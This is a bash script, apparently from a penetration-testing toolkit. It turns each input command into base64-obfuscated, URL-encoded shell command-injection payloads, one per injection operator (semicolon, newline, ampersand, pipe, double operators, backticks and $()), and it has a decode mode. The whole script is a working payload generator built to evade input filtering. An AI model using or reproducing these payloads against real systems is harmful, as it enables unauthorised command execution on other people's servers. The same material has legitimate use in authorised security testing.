#!/bin/bash

#global functions include
. `dirname $0`/functions.sh

usage() {
	BN=`basename $0`
	echo "$1"
	echo "Usage: $BN [-e | -d] [-f input_file]"
	echo "base64 encode stdin or input_file in a way suitable for linux shell command injection, i.e. uses various injection operators like ; \\n & | ..."
	echo "-e = encode - DEFAULT"
	echo "-d = decode"
	exit 2
}

#injectionMethods=(';~' '\n~' '&~' '|~' '&&~' '||~' '`~`' '$(~)')
injectionMethods=('%3b~' '%0a~' '%26~' '%7c~' '%26%26~' '%7c%7c~' '%60~%60' '%24%28~%29')


############################################
# OPTIONS
############################################
MODE="e"
while getopts "edf:" opt; do
	case "$opt" in
		e)
			MODE="e"
			;;
		d)
			MODE="d"
			;;
		f)
			FILE="$OPTARG"
			;;
        \?)
            echo "Error: Invalid option: -$OPTARG" >&2
            exit 1
            ;;
        :)
            echo "Error: Option -$OPTARG requires an argument." >&2
            exit 1
            ;;
    esac
done

shift $((OPTIND-1))

if [ -n "$FILE" ]; then 
	[ ! -r "$FILE" ] && usage "Error: Cannot read file $FILE"
else
	FILE="/dev/stdin"
fi

############################################
# MAIN
############################################
case "$MODE" in
	e)
		grep -v "^#" $FILE | while IFS= read -r x; do
			b=$(echo "$x" | base64)
			b="%24%28base64%09-d<<<$b%29"
			for im in "${injectionMethods[@]}"; do
				echo ${im/\~/$b}
			done
		done
		;;
	d)
		while IFS= read -r x; do
			urldec=$(echo "$x" | urled -d)
			b64=$(echo "$urldec" | sed -n "s/.*base64\t-d<<<\(.*\))/\1/p")
			s=$(echo "$b64" | base64 -d)
			echo "$urldec" | sed "s~\$(base64\t-d<<<$b64)~$s~"
		done <$FILE
		;;
esac

exit 0
